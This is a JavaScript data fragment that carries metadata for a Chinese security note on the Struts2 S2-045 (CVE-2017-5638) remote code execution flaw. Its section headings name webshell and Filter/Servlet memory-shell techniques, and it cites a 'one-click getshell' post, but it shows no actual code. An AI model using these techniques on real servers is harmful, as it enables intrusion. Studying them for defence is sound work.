- ccadmin - 博客园 (cnblogs.com) s2-045真正一键getshell菜刀马-突破任何限制 | pirogue 漏洞概述 漏洞编号: CVE-2017-5638 Struts2远程代码执行漏洞 漏洞类型: 远程代码执行漏洞 危险等级: 高危 利用条件: Struts2在受影响版本内..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"http://cdn.ayusummer233.top/DailyNotes/202409201522232.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-04-16T10:17:38.000Z"}],["meta",{"property":"article:tag","content":"内存马"}],["meta",{"property":"article:tag","content":"Struts2"}],["meta",{"property":"article:modified_time","content":"2025-04-16T10:17:38.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"s2-045内存马\\",\\"image\\":[\\"http://cdn.ayusummer233.top/DailyNotes/202409201522232.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409201523134.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409201526590.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202409201526648.png\\"],\\"dateModified\\":\\"2025-04-16T10:17:38.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"咸鱼型233\\",\\"url\\":\\"https://233official.github.io/dailynotes/\\"}]}"]],"date":"2024-09-12T10:56:59.000Z"},"headers":[{"level":2,"title":"漏洞概述","slug":"漏洞概述","link":"#漏洞概述","children":[]},{"level":2,"title":"漏洞分析","slug":"漏洞分析","link":"#漏洞分析","children":[]},{"level":2,"title":"命令执行写文件","slug":"命令执行写文件","link":"#命令执行写文件","children":[]},{"level":2,"title":"命令执行写 Filter 内存马","slug":"命令执行写-filter-内存马","link":"#命令执行写-filter-内存马","children":[]},{"level":2,"title":"Servlet马","slug":"servlet马","link":"#servlet马","children":[]},{"level":2,"title":"其他内存马","slug":"其他内存马","link":"#其他内存马","children":[]}],"git":{"createdTime":1726138619000,"updatedTime":1744798658000,"contributors":[{"name":"233Mac","username":"233Mac","email":"ayusummer233@vip.qq.com","commits":3,"url":"https://github.com/233Mac"},{"name":"233","username":"233","email":"ayusummer233@vip.qq.com","commits":3,"url":"https://github.com/233"}]},"readingTime":{"minutes":3.83,"words":1149},"filePathRelative":"网络安全/Web安全/漏洞类型/内存马/Java内存马/Struts2内存马/s2-045内存马.md","localizedDate":"2024年9月12日","excerpt":"","autoDesc":true}');export{c as comp,o as data};
